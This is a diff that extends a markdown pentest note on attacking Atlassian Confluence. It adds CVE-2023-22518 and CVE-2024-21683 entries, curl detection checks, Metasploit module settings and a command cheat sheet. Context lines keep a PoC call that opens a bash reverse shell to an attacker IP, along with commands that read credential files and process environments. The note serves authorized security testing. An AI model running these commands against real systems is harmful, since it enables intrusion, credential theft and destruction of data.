@@ -1,3 +1,5 @@
+# Confluence
+
 #Confluence #Atlassian #wiki #webservices #RCE #OGNL
 
 ## What is Confluence?
@@ -9,6 +11,18 @@ Atlassian's team wiki and collaboration platform. Widely deployed in enterprise 
 - Config: `<confluence_home>/confluence.cfg.xml` — DB credentials
 - Default install path: `/opt/atlassian/confluence/`
 - Home dir: `/var/atlassian/application-data/confluence/`
+
+---
+
+## Tools
+
+| Tool | Use |
+|---|---|
+| [[Tools/Scanning/NMAP\|nmap]] | Port/version fingerprint (`http-title`, banner on 8090/8091) |
+| [[Tools/File Transfer/cURL\|cURL]] | Version fingerprint, REST API enum, all unauth-RCE PoCs, wiki credential search |
+| [[Tools/Scanning/gobuster\|gobuster]] | Content/endpoint discovery |
+| [[Tools/Payloads & Shells/metasploit\|metasploit]] | `atlassian_confluence_*` OGNL/SSTI/config-restore RCE modules |
+| [[Tools/Database/mysql\|mysql]] | Connect to the backend DB with config-file creds to dump `cwd_user` hashes |
 
 ---
 
@@ -53,6 +67,8 @@ confluence / confluence
 
 | CVE | Versions Affected | Type | Auth Required |
 |---|---|---|---|
+| CVE-2023-22518 | All < 7.19.16, 8.3.x < 8.3.4, 8.4.x < 8.4.4, 8.5.x < 8.5.4, 8.6.0 | Improper authz → admin reset → RCE (CVSS 10) | No |
+| CVE-2024-21683 | 5.2–8.9.0 (fixed 7.19.22/8.5.9/8.9.1) | "Add a New Language" → RCE | Yes (macro-lang perm) |
 | CVE-2023-22527 | 8.0.x–8.5.3 (also 8.6.x–8.8.x in some builds) | SSTI → RCE | No |
 | CVE-2022-26134 | All < 7.4.17, 7.13.x < 7.13.7, 7.14.x–7.18.x < 7.18.1 | OGNL injection → RCE | No |
 | CVE-2021-26084 | < 6.13.23, 6.14.x–7.11.x < 7.11.6, 7.12.x < 7.12.5 | OGNL injection → RCE | Partial (some configs no auth) |
@@ -61,6 +77,32 @@ confluence / confluence
 ---
 
 ## Attack Vectors
+
+### CVE-2023-22518 — Unauthenticated Improper Authorization → Admin Reset → RCE
+
+CVSS **10.0**, CISA KEV, exploited as a 0-day (Cerber ransomware). Unauthenticated access to the `setup-restore` administrative endpoints lets an attacker restore a crafted backup / reset the instance and create a new admin, then reach RCE (e.g. via the Groovy script console or a plugin upload once admin). Affects **all** Server/Data Center builds before the fixed versions; Atlassian Cloud is not affected.
+
+```bash
+# The vulnerable endpoints are the setup/restore actions reachable pre-auth:
+#   /json/setup-restore.action
+#   /json/setup-restore-local.action
+#   /json/setup-restore-progress.action
+# A malicious workflow: POST a crafted app-data/backup zip to setup-restore to
+# overwrite the instance (data destruction) or seed an attacker admin account.
+
+# Detect the endpoint responds without auth (should be 302→login on a patched build)
+curl -sk -o /dev/null -w "%{http_code}\n" -X POST \
+  "http://<target>:8090/json/setup-restore.action?synchronous=true" \
+  -H "X-Atlassian-Token: no-check" -H "Content-Type: multipart/form-data"
+
+# Metasploit (data-destruction / auth-bypass module)
+use auxiliary/admin/http/atlassian_confluence_auth_bypass_cve_2023_22518
+set RHOSTS <target>
+set RPORT 8090
+run
+```
+
+> [!warning] **This is a destructive primitive.** The public PoC path overwrites/resets the instance — in an authorized test, prefer the detection check and coordinate before running any restore. RCE is a *chained* step (admin → Groovy console / malicious plugin), not a single request.
 
 ### CVE-2022-26134 — Unauthenticated OGNL RCE
 
@@ -112,6 +154,24 @@ run
 python3 CVE-2023-22527.py --url http://<target>:8090 --cmd "id"
 python3 CVE-2023-22527.py --url http://<target>:8090 \
   --cmd "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1'"
+```
+
+### CVE-2024-21683 — Authenticated RCE via "Add a New Language"
+
+CVSS 8.3. A user with permission to add a code-macro language can upload a malicious JavaScript language definition; the `RhinoLanguageParser` allows Java class access, so `java.lang.Runtime.getRuntime().exec(...)` in the file runs on the host. Useful post-credential (default-creds, phished, or after harvesting a low-priv login) when no unauth path exists on a patched-ish build. Affects 5.2–8.9.0.
+
+```bash
+# Path: Confluence Admin → Configure Code Macro → Add a new language → upload malicious .js
+# The uploaded JS reaches server-side RCE via Rhino Java bridge.
+
+# Metasploit (handles auth + upload)
+use exploit/multi/http/atlassian_confluence_rce_cve_2024_21683
+set RHOSTS <target>
+set RPORT 8090
+set USERNAME <user>
+set PASSWORD <pass>
+set LHOST <attacker_ip>
+run
 ```
 
 ### CVE-2021-26084 — OGNL Injection (Pre/Post Auth)
@@ -207,6 +267,8 @@ cat /proc/$(pgrep -f confluence)/environ | tr '\0' '\n'
 | Setting | Risk |
 |---|---|
 | Unpatched version (pre-7.18.1, 8.x pre-8.5.4) | Unauthenticated RCE via CVE-2022-26134 / CVE-2023-22527 |
+| Any build pre-8.5.4 / 7.19.16 reachable unauth | CVE-2023-22518 — instance reset, attacker-admin, data destruction |
+| Low-priv users with code-macro-language permission | CVE-2024-21683 — authenticated RCE |
 | Public access to spaces | Sensitive info in wiki pages |
 | Default admin credentials | Admin access → RCE |
 | DB exposed on network with config creds | Direct DB access |
@@ -219,9 +281,17 @@ cat /proc/$(pgrep -f confluence)/environ | tr '\0' '\n'
 | Goal | Command |
 |---|---|
 | Version check | `curl -s http://host:8090/login.action \| grep ajs-version` |
+| CVE-2023-22518 auth-bypass (MSF) | `auxiliary/admin/http/atlassian_confluence_auth_bypass_cve_2023_22518` |
 | CVE-2022-26134 (MSF) | `exploit/multi/http/atlassian_confluence_namespace_ognl_injection` |
 | CVE-2023-22527 (MSF) | `exploit/multi/http/atlassian_confluence_ssti_rce` |
+| CVE-2024-21683 authed RCE (MSF) | `exploit/multi/http/atlassian_confluence_rce_cve_2024_21683` |
 | CVE-2021-26084 (MSF) | `exploit/multi/http/atlassian_confluence_webwork_ognl_injection` |
 | Public space enum | `curl -s http://host:8090/rest/api/space` |
 | Search for passwords | `curl -s "http://host:8090/rest/api/search?cql=text+%7E+%22password%22" -u user:pass` |
 | Config file (DB creds) | `cat /var/atlassian/application-data/confluence/confluence.cfg.xml` |
+
+---
+
+*Created: 2026-07-13*
+*Updated: 2026-09-24*
+*Model: claude-opus-4-8*
